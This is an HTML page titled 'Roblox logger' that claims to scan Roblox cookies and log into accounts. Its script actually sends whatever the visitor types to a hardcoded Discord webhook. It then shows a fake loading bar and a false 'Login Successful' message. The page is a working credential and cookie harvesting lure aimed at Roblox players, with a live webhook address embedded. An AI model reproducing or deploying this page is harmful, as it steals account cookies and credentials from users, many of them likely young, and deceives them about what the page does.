<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox logger</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            cursor: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path d="M3 3l18 18M3 21L21 3" stroke="%239333ea" stroke-width="2" stroke-linecap="round"/><path d="M6 6l6 6m-6 6l6-6" stroke="%239333ea" stroke-width="1.5" stroke-linecap="round"/></svg>') 0 0, auto;
        }

        body {
            width: 100%;
            height: 100vh;
            background: linear-gradient(45deg, #0a0e27, #1a1a3e, #0f1d3d, #1a0a2e, #0a0e27);
            background-size: 400% 400%;
            overflow: hidden;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', sans-serif;
            color: #fff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            position: relative;
        }

        /* Animated background */
        .bg-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 0;
        }

        .gradient-blob-1 {
            position: absolute;
            width: 500px;
            height: 500px;
            background: radial-gradient(circle at 30% 30%, rgba(147, 51, 234, 0.25) 0%, transparent 70%);
            border-radius: 50%;
            top: -150px;
            left: -150px;
            filter: blur(60px);
            animation: blob1 15s ease-in-out infinite;
        }

        .gradient-blob-2 {
            position: absolute;
            width: 450px;
            height: 450px;
            background: radial-gradient(circle at 70% 70%, rgba(99, 102, 241, 0.2) 0%, transparent 70%);
            border-radius: 50%;
            bottom: -100px;
            right: -100px;
            filter: blur(60px);
            animation: blob2 18s ease-in-out infinite;
        }

        .gradient-blob-3 {
            position: absolute;
            width: 400px;
            height: 400px;
            background: radial-gradient(circle at 50% 50%, rgba(168, 85, 247, 0.2) 0%, transparent 70%);
            border-radius: 50%;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            filter: blur(70px);
            animation: blob3 20s ease-in-out infinite;
        }

        @keyframes blob1 {
            0%, 100% { transform: translate(0, 0) scale(1); }
            50% { transform: translate(50px, 50px) scale(1.1); }
        }

        @keyframes blob2 {
            0%, 100% { transform: translate(0, 0) scale(1); }
            50% { transform: translate(-30px, -30px) scale(1.05); }
        }

        @keyframes blob3 {
            0%, 100% { transform: translate(-50%, -50%) scale(1); }
            50% { transform: translate(-50%, -50%) scale(1.15); }
        }

        /* Animated particles background */
        .particles-bg {
            position: absolute;
            width: 2px;
            height: 2px;
            background: rgba(147, 51, 234, 0.6);
            border-radius: 50%;
            animation: floatBg 20s infinite linear;
        }

        @keyframes floatBg {
            0% {
                opacity: 0;
                transform: translateY(100vh) translateX(0);
            }
            10% {
                opacity: 1;
            }
            90% {
                opacity: 1;
            }
            100% {
                opacity: 0;
                transform: translateY(-100vh) translateX(100px);
            }
        }

        /* Title */
        .title {
            position: relative;
            z-index: 10;
            font-size: 56px;
            font-weight: 900;
            margin-bottom: 100px;
            letter-spacing: 3px;
            text-align: center;
        }

        .title-word-1 {
            color: #ffffff;
            display: inline-block;
            margin-right: 15px;
        }

        .title-word-2 {
            background: linear-gradient(135deg, #9333ea, #a855f7, #d8b4fe);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            display: inline-block;
            font-weight: 900;
            filter: drop-shadow(0 0 20px rgba(147, 51, 234, 0.4));
        }

        /* Input section */
        .input-section {
            position: relative;
            z-index: 100;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 20px;
        }

        /* Input bar styling */
        .text-bar {
            position: relative;
            opacity: 1;
            pointer-events: all;
        }

        .text-bar-content {
            background: rgba(26, 22, 37, 0.8);
            border: 2px solid #9333ea;
            padding: 20px 30px;
            color: #ffffff;
            font-size: 15px;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            box-shadow: 0 20px 60px rgba(147, 51, 234, 0.25), inset 0 0 20px rgba(147, 51, 234, 0.05);
            border-radius: 15px;
            display: flex;
            align-items: center;
            gap: 12px;
            backdrop-filter: blur(20px);
            transition: all 0.3s ease;
        }

        .text-bar-content:hover {
            border-color: #a855f7;
            box-shadow: 0 20px 80px rgba(147, 51, 234, 0.35), inset 0 0 30px rgba(147, 51, 234, 0.1);
        }

        .text-bar-content:focus-within {
            border-color: #c084fc;
            box-shadow: 0 25px 100px rgba(147, 51, 234, 0.4), inset 0 0 40px rgba(147, 51, 234, 0.15);
        }

        .text-bar-prompt {
            color: #9333ea;
            white-space: nowrap;
            font-weight: bold;
            font-size: 16px;
        }

        .text-bar-input {
            background: transparent;
            border: none;
            color: #ffffff;
            font-size: 15px;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            outline: none;
            min-width: 450px;
            font-weight: 500;
        }

        .text-bar-input::placeholder {
            color: rgba(255, 255, 255, 0.4);
        }

        .text-bar-input:focus::placeholder {
            color: rgba(255, 255, 255, 0.3);
        }

        .send-btn {
            background: linear-gradient(135deg, #9333ea, #a855f7);
            border: none;
            color: white;
            padding: 10px 20px;
            border-radius: 8px;
            cursor: pointer;
            font-weight: bold;
            transition: all 0.3s ease;
        }

        .send-btn:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 10px 25px rgba(147, 51, 234, 0.4);
        }

        .send-btn:active:not(:disabled) {
            transform: translateY(0);
        }

        .send-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        /* Description text */
        .description {
            color: #a0a0a0;
            font-size: 14px;
            text-align: center;
            margin-top: 10px;
            letter-spacing: 1px;
            font-weight: 500;
        }

        /* Particles effect */
        .particle-effect {
            position: fixed;
            pointer-events: none;
            z-index: 99;
        }

        .particle-item {
            position: absolute;
            width: 8px;
            height: 8px;
            background: #9333ea;
            border-radius: 50%;
            box-shadow: 0 0 10px #9333ea;
        }

        /* Loading bar */
        .loading-container {
            position: fixed;
            bottom: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(10, 14, 39, 0.95);
            display: none;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            z-index: 200;
            backdrop-filter: blur(10px);
            pointer-events: none;
        }

        .loading-container.active {
            display: flex;
            pointer-events: all;
        }

        .loading-bar-container {
            width: 300px;
            height: 6px;
            background: rgba(147, 51, 234, 0.2);
            border-radius: 10px;
            overflow: hidden;
            border: 1px solid rgba(147, 51, 234, 0.5);
            margin-bottom: 30px;
        }

        .loading-bar {
            height: 100%;
            background: linear-gradient(90deg, #9333ea, #a855f7, #9333ea);
            background-size: 200% 100%;
            width: 0%;
            animation: loading 15s ease-in-out forwards;
            border-radius: 10px;
        }

        @keyframes loading {
            0% { width: 0%; }
            100% { width: 100%; }
        }

        .loading-text {
            color: #9333ea;
            font-size: 16px;
            font-weight: 600;
            text-align: center;
        }

        .success-message {
            color: #4ade80;
            font-size: 18px;
            font-weight: 700;
            margin-top: 30px;
            opacity: 0;
            animation: fadeInSuccess 0.5s ease-in-out 15s forwards;
        }

        @keyframes fadeInSuccess {
            to {
                opacity: 1;
            }
        }

        /* Status message */
        .status-message {
            position: fixed;
            top: 30px;
            right: 30px;
            color: #9333ea;
            font-size: 14px;
            z-index: 5;
            transition: opacity 0.3s ease;
            background: rgba(26, 22, 37, 0.9);
            padding: 15px 20px;
            border-radius: 10px;
            border: 1px solid rgba(147, 51, 234, 0.3);
            backdrop-filter: blur(20px);
            font-weight: 500;
        }

        .status-message.hidden {
            opacity: 0;
            pointer-events: none;
        }

        /* Responsive */
        @media (max-width: 768px) {
            .title {
                font-size: 36px;
                margin-bottom: 60px;
            }

            .text-bar-input {
                min-width: 250px;
            }

            .text-bar-content {
                padding: 15px 20px;
                font-size: 13px;
            }

            .description {
                font-size: 12px;
            }
        }
    </style>
</head>
<body>
    <div class="bg-container">
        <div class="gradient-blob-1"></div>
        <div class="gradient-blob-2"></div>
        <div class="gradient-blob-3"></div>
    </div>

    <div class="title">
        <span class="title-word-1">Roblox</span>
        <span class="title-word-2">Cookie</span>
    </div>

    <div class="input-section">
        <div class="text-bar" id="textBar">
            <div class="text-bar-content">
                <span class="text-bar-prompt">> </span>
                <input type="text" class="text-bar-input" id="userInput" placeholder="ENTER YOUR MESSAGE..." autocomplete="off">
                <button class="send-btn" id="sendBtn">Send</button>
            </div>
        </div>
        <div class="description">Scan all cookie of roblox to log in all roblox acounts</div>
    </div>

    <div class="loading-container" id="loadingContainer">
        <div class="loading-bar-container">
            <div class="loading-bar"></div>
        </div>
        <div class="loading-text">Loading in progress...</div>
        <div class="success-message">✅ Login Successful Check Your Roblox Page</div>
    </div>

    <div class="status-message hidden" id="statusMessage"></div>

    <script>
        // Discord Webhook URL
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1512483780990996510/M32pQZDO3_rDZ6_lY_lJDJB-wV6XTzKDqvHCWDWaJClelP8y79wqmgpLGJ09DtPMASMK';

        // Generate background particles
        function generateBackgroundParticles() {
            const bgContainer = document.querySelector('.bg-container');
            for (let i = 0; i < 30; i++) {
                const particle = document.createElement('div');
                particle.className = 'particles-bg';
                particle.style.left = Math.random() * 100 + '%';
                particle.style.top = Math.random() * 100 + '%';
                particle.style.animationDelay = Math.random() * 20 + 's';
                particle.style.animationDuration = (Math.random() * 10 + 15) + 's';
                bgContainer.appendChild(particle);
            }
        }

        generateBackgroundParticles();

        // Input bar logic
        const userInput = document.getElementById('userInput');
        const sendBtn = document.getElementById('sendBtn');
        const statusMessage = document.getElementById('statusMessage');
        const loadingContainer = document.getElementById('loadingContainer');

        function showStatus(message, duration = 3000) {
            statusMessage.textContent = message;
            statusMessage.classList.remove('hidden');
            setTimeout(() => {
                statusMessage.classList.add('hidden');
            }, duration);
        }

        // Create particle explosion effect
        function createParticleExplosion(x, y) {
            for (let i = 0; i < 50; i++) {
                const particle = document.createElement('div');
                particle.className = 'particle-item';
                
                const container = document.createElement('div');
                container.className = 'particle-effect';
                container.style.left = x + 'px';
                container.style.top = y + 'px';
                container.appendChild(particle);
                document.body.appendChild(container);

                const angle = (Math.PI * 2 * i) / 50;
                const velocity = 5 + Math.random() * 10;
                const vx = Math.cos(angle) * velocity;
                const vy = Math.sin(angle) * velocity;

                let px = 0, py = 0;
                let life = 100;

                const animate = () => {
                    px += vx;
                    py += vy;
                    life -= 2;

                    particle.style.transform = `translate(${px}px, ${py}px)`;
                    particle.style.opacity = life / 100;

                    if (life > 0) {
                        requestAnimationFrame(animate);
                    } else {
                        container.remove();
                    }
                };

                animate();
            }
        }

        // Send button click
        sendBtn.addEventListener('click', async (e) => {
            e.preventDefault();
            
            if (userInput.value.trim() && !sendBtn.disabled) {
                const message = userInput.value.trim();
                const rect = sendBtn.getBoundingClientRect();
                
                // Create explosion at button location
                createParticleExplosion(rect.left + rect.width / 2, rect.top + rect.height / 2);
                
                userInput.value = '';
                sendBtn.disabled = true;

                try {
                    showStatus('📤 SENDING MESSAGE...');

                    const response = await fetch(WEBHOOK_URL, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            content: message,
                            username: 'Roblox Cookie',
                            avatar_url: 'https://images.emojiterra.com/twitter/v14.0/128px/1f36a.png'
                        })
                    });

                    if (response.ok) {
                        showStatus('✅ MESSAGE SENT');
                        // Show loading screen
                        loadingContainer.classList.add('active');
                        
                        // Hide loading screen after 16 seconds
                        setTimeout(() => {
                            loadingContainer.classList.remove('active');
                            sendBtn.disabled = false;
                            userInput.focus();
                        }, 16000);
                    } else {
                        showStatus('❌ ERROR SENDING MESSAGE');
                        sendBtn.disabled = false;
                        userInput.focus();
                    }
                } catch (error) {
                    console.error('Error:', error);
                    showStatus('❌ CONNECTION ERROR');
                    sendBtn.disabled = false;
                    userInput.focus();
                }
            }
        });

        // Enter key to send
        userInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter' && userInput.value.trim() && !sendBtn.disabled) {
                sendBtn.click();
            }
        });

        userInput.focus();
    </script>
</body>
</html>
